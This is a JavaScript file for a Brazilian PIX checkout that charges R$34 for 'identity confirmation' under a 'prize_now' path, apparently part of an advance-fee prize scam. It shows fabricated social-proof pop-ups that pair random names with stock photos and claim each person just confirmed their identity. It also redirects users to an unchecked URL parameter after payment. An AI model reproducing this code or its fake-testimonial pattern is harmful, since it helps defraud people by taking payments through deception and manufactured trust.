/**
 * payment-new.js
 * Integração PIX — BRPix Digital
 * Checkout: prize_now/pagamento
 */

// ─── Configuração ────────────────────────────────────────────────────────────

const CHECKOUT_ID = '69adc95b77';

const CONFIG = {
    // Endpoints proxy (Vercel Serverless) — a API_KEY fica no servidor
    PROXY_CREATE: '/api/pix',
    PROXY_STATUS: '/api/pix',
    PRODUCT: {
        title: 'Confirmação de Identidade',
        amount: 3400, // R$ 34,00 em centavos
    },
    CUSTOMER_DEFAULTS: {
        email: 'default@it.me',
        phone: '11999999999',
    },
    POLL_INTERVAL_MS: 3000,
    SUCCESS_REDIRECT_DELAY: 7000,
    SUCCESS_STATUSES: ['paid'],
    FAILURE_STATUSES: ['refused', 'failed', 'expired', 'canceled', 'chargeback'],
};

// ─── Validação de CPF ────────────────────────────────────────────────────────

function validarCPF(cpf) {
    const digits = cpf.replace(/\D/g, '');

    if (digits.length !== 11) return false;
    if (/^(\d)\1+$/.test(digits)) return false; // todos os dígitos iguais

    let sum = 0;
    for (let i = 0; i < 9; i++) sum += parseInt(digits[i]) * (10 - i);
    let d1 = (sum * 10) % 11;
    if (d1 === 10 || d1 === 11) d1 = 0;
    if (d1 !== parseInt(digits[9])) return false;

    sum = 0;
    for (let i = 0; i < 10; i++) sum += parseInt(digits[i]) * (11 - i);
    let d2 = (sum * 10) % 11;
    if (d2 === 10 || d2 === 11) d2 = 0;
    if (d2 !== parseInt(digits[10])) return false;

    return true;
}

// ─── Helpers de DOM ──────────────────────────────────────────────────────────

function el(id) {
    return document.getElementById(id);
}

function showModal(id) {
    const m = el(id);
    if (m) { m.classList.remove('hidden'); m.classList.add('flex'); }
}

function hideModal(id) {
    const m = el(id);
    if (m) { m.classList.add('hidden'); m.classList.remove('flex'); }
}

function showError(message) {
    const msgEl = el(`error-modal-message-${CHECKOUT_ID}`);
    if (msgEl) msgEl.textContent = message;
    showModal(`error-modal-${CHECKOUT_ID}`);
}

function formatCurrency(amountInCents) {
    return (amountInCents / 100).toLocaleString('pt-BR', {
        style: 'currency',
        currency: 'BRL',
    });
}

function setButtonLoading(loading) {
    const btn = el(`pay-button-${CHECKOUT_ID}`);
    if (!btn) return;
    if (loading) {
        btn.disabled = true;
        btn.innerHTML = '<div class="loader"></div><span>Processando...</span>';
    } else {
        btn.disabled = false;
        btn.innerHTML = '<span>PAGAR AGORA</span>';
    }
}

// ─── Ativação do Botão ───────────────────────────────────────────────────────

function atualizarBotao() {
    const nameVal = (el(`name-${CHECKOUT_ID}`)?.value || '').trim();
    const cpfVal = el(`document-${CHECKOUT_ID}`)?.value || '';
    const btn = el(`pay-button-${CHECKOUT_ID}`);
    const cpfError = el('warn-cpfError');

    if (!btn) return;

    const temNome = nameVal.length >= 3 && nameVal.includes(' ');
    const cpfDigits = cpfVal.replace(/\D/g, '');
    const cpfCompleto = cpfDigits.length === 11;
    const cpfValido = cpfCompleto && validarCPF(cpfVal);
    const podePagar = temNome && cpfValido;

    btn.disabled = !podePagar;
    btn.style.backgroundColor = podePagar ? '#ff0150' : 'hsl(0, 0%, 63%)';

    if (cpfError) {
        cpfError.hidden = !cpfCompleto || cpfValido;
    }
}

// ─── Exibição do Modal PIX ───────────────────────────────────────────────────

function exibirModalPIX(txData) {
    const { pix, amount } = txData;

    // Código PIX copia-e-cola
    const pixInput = el(`pix-code-input-${CHECKOUT_ID}`);
    if (pixInput) pixInput.value = pix.qrcodeText || '';

    // Valor
    const valorEl = el(`pix-valor-${CHECKOUT_ID}`);
    if (valorEl) valorEl.textContent = formatCurrency(amount);

    // Expiração
    const expEl = el(`modal-expiration-${CHECKOUT_ID}`);
    if (expEl && pix.expirationDate) {
        const exp = new Date(pix.expirationDate);
        expEl.textContent = exp.toLocaleString('pt-BR', {
            day: '2-digit', month: '2-digit', year: 'numeric',
            hour: '2-digit', minute: '2-digit',
        });
    }

    // Gerar QR Code localmente
    const qrContainer = el(`qrcode-${CHECKOUT_ID}`);
    if (qrContainer && pix.qrcodeText) {
        qrContainer.innerHTML = '';
        new QRCode(qrContainer, {
            text: pix.qrcodeText,
            width: 184,
            height: 184,
            colorDark: '#000000',
            colorLight: '#ffffff',
            correctLevel: QRCode.CorrectLevel.M,
        });
    }

    showModal(`pix-modal-${CHECKOUT_ID}`);
}

// ─── Polling de Status ───────────────────────────────────────────────────────

let pollInterval = null;

function iniciarPolling(transactionId) {
    pollInterval = setInterval(async () => {
        try {
            const res = await fetch(`${CONFIG.PROXY_STATUS}/${transactionId}`, {
                method: 'GET',
                headers: { 'Content-Type': 'application/json' },
            });

            if (!res.ok) return; // Erro temporário — aguarda próxima tentativa

            const data = await res.json();
            const status = data.status;

            if (CONFIG.SUCCESS_STATUSES.includes(status)) {
                clearInterval(pollInterval);
                pollInterval = null;
                onPagamentoAprovado();

            } else if (CONFIG.FAILURE_STATUSES.includes(status)) {
                clearInterval(pollInterval);
                pollInterval = null;
                hideModal(`pix-modal-${CHECKOUT_ID}`);
                showError('Não foi possível confirmar o pagamento. Por favor, tente novamente.');
            }
            // Demais status (waiting_payment, in_analysis): continua aguardando

        } catch (err) {
            console.error('[Polling] Erro ao verificar status:', err);
        }
    }, CONFIG.POLL_INTERVAL_MS);
}

// ─── Pós-Pagamento: Sucesso ──────────────────────────────────────────────────

function onPagamentoAprovado() {
    // Substituir conteúdo do modal pelo de sucesso
    const pixModal = el(`pix-modal-${CHECKOUT_ID}`);
    const modalInner = pixModal?.querySelector('.bg-white, .rounded-2xl');

    if (modalInner) {
        modalInner.innerHTML = `
      <div class="flex items-center justify-center mb-4">
        <div class="h-16 w-16 rounded-full bg-green-50 flex items-center justify-center">
          <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
          </svg>
        </div>
      </div>
      <h2 class="text-2xl font-semibold text-gray-900 mb-1">Pagamento aprovado</h2>
      <p class="text-sm text-gray-600 mb-4">Obrigado pela sua compra — seu pagamento foi processado com sucesso.</p>
    `;
    }

    showModal(`pix-modal-${CHECKOUT_ID}`);

    // Redirecionar após delay
    setTimeout(() => {
        const params = new URLSearchParams(window.location.search);
        const nextPage = params.get('next_page') || '/';
        window.location.href = nextPage;
    }, CONFIG.SUCCESS_REDIRECT_DELAY);
}

// ─── Criação da Transação PIX ────────────────────────────────────────────────

async function criarTransacaoPIX(name, cpf) {
    const payload = {
        customer: {
            name,
            email: CONFIG.CUSTOMER_DEFAULTS.email,
            phone: CONFIG.CUSTOMER_DEFAULTS.phone,
            document: {
                number: cpf.replace(/\D/g, ''),
                type: 'CPF',
            },
        },
        paymentMethod: 'PIX',
        amount: CONFIG.PRODUCT.amount,
        items: [
            {
                title: CONFIG.PRODUCT.title,
                unitPrice: CONFIG.PRODUCT.amount,
                quantity: 1,
            },
        ],
        pix: {
            expiresInDays: 1,
        },
    };

    const res = await fetch(CONFIG.PROXY_CREATE, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
    });

    const data = await res.json();

    if (!res.ok) {
        const details = data?.error?.details;
        const msg = Array.isArray(details) && details.length
            ? details.join('. ')
            : data?.error?.message || 'Ocorreu um erro ao gerar o PIX.';
        throw new Error(msg);
    }

    return data;
}

// ─── Copiar Código PIX ───────────────────────────────────────────────────────

async function copiarCodigoPIX() {
    const pixInput = el(`pix-code-input-${CHECKOUT_ID}`);
    const copyBtn = el(`copy-button-${CHECKOUT_ID}`);
    if (!pixInput || !copyBtn) return;

    const code = pixInput.value;
    const span = copyBtn.querySelector('span');
    const original = span?.textContent || 'Copiar Código PIX';

    try {
        if (navigator.clipboard && window.isSecureContext) {
            await navigator.clipboard.writeText(code);
        } else {
            pixInput.select();
            document.execCommand('copy');
        }
        if (span) span.textContent = 'Copiado! ✓';
        setTimeout(() => { if (span) span.textContent = original; }, 2000);
    } catch {
        alert('Falha ao copiar. Selecione e copie o código manualmente.');
    }
}

// ─── Social Proof Toasts ─────────────────────────────────────────────────────

const SOCIAL_PROOF = {
    names: ['Maria', 'José', 'Ana', 'João', 'Antônio', 'Francisco', 'Carlos', 'Paulo', 'Pedro', 'Lucas', 'Sandra', 'Camila', 'Amanda', 'Fernanda'],
    message: '{nome} acabou de confirmar sua identidade',
    intervalMin: 8000,
    intervalMax: 18000,
    displayDuration: 5000,
};

function exibirToast() {
    const container = el(`social-proof-container-${CHECKOUT_ID}`);
    if (!container) return;

    const name = SOCIAL_PROOF.names[Math.floor(Math.random() * SOCIAL_PROOF.names.length)];
    const text = SOCIAL_PROOF.message.replace('{nome}', `<strong>${name}</strong>`);
    const imgId = Date.now() % 1000;

    const toast = document.createElement('div');
    toast.className = 'social-proof-toast';
    toast.innerHTML = `
    <div style="display:flex;align-items:center;gap:12px;">
      <img src="https://picsum.photos/40/40?random=${imgId}" alt="Usuário" style="width:40px;height:40px;border-radius:50%;object-fit:cover;flex-shrink:0;">
      <div>
        <div style="font-size:14px;color:#e2e8f0;">${text}</div>
        <div style="font-size:12px;color:#94a3b8;margin-top:2px;">agora mesmo</div>
      </div>
    </div>
  `;

    container.appendChild(toast);
    setTimeout(() => toast.classList.add('show'), 50);
    setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => toast.remove(), 500);
    }, SOCIAL_PROOF.displayDuration);
}

function agendarProximoToast() {
    const delay = SOCIAL_PROOF.intervalMin + Math.random() * (SOCIAL_PROOF.intervalMax - SOCIAL_PROOF.intervalMin);
    setTimeout(() => {
        exibirToast();
        agendarProximoToast();
    }, delay);
}

// ─── Inicialização ───────────────────────────────────────────────────────────

document.addEventListener('DOMContentLoaded', () => {
    const form = el(`payment-form-${CHECKOUT_ID}`);
    const nameInput = el(`name-${CHECKOUT_ID}`);
    const cpfInput = el(`document-${CHECKOUT_ID}`);
    const totalEl = el(`total-price-${CHECKOUT_ID}`);
    const copyBtn = el(`copy-button-${CHECKOUT_ID}`);
    const pixClose = el(`pix-modal-close-${CHECKOUT_ID}`);

    // Exibir valor total no resumo do pedido
    if (totalEl) totalEl.textContent = formatCurrency(CONFIG.PRODUCT.amount);

    // Atualizar estado do botão conforme o usuário digita
    nameInput?.addEventListener('input', atualizarBotao);
    cpfInput?.addEventListener('input', atualizarBotao);

    // Botão de copiar código PIX
    copyBtn?.addEventListener('click', copiarCodigoPIX);

    // Fechar modal PIX
    pixClose?.addEventListener('click', () => hideModal(`pix-modal-${CHECKOUT_ID}`));

    // Fechar modal de erro
    const errorClose = el(`error-modal-${CHECKOUT_ID}`)?.querySelector('button');
    errorClose?.addEventListener('click', () => hideModal(`error-modal-${CHECKOUT_ID}`));

    // Submit do formulário
    form?.addEventListener('submit', async (e) => {
        e.preventDefault();

        const name = (nameInput?.value || '').trim();
        const cpf = cpfInput?.value || '';

        if (!validarCPF(cpf)) {
            showError('CPF inválido. Verifique o número e tente novamente.');
            return;
        }

        setButtonLoading(true);

        try {
            const txData = await criarTransacaoPIX(name, cpf);
            exibirModalPIX(txData);
            iniciarPolling(txData.id);
        } catch (err) {
            console.error('[Checkout] Erro na criação do PIX:', err);
            showError(err.message || 'Ocorreu um erro inesperado. Tente novamente.');
        } finally {
            setButtonLoading(false);
        }
    });

    // Estado inicial do botão
    atualizarBotao();

    // Social proof (começa após 5s para não distrair no início)
    setTimeout(agendarProximoToast, 5000);
});
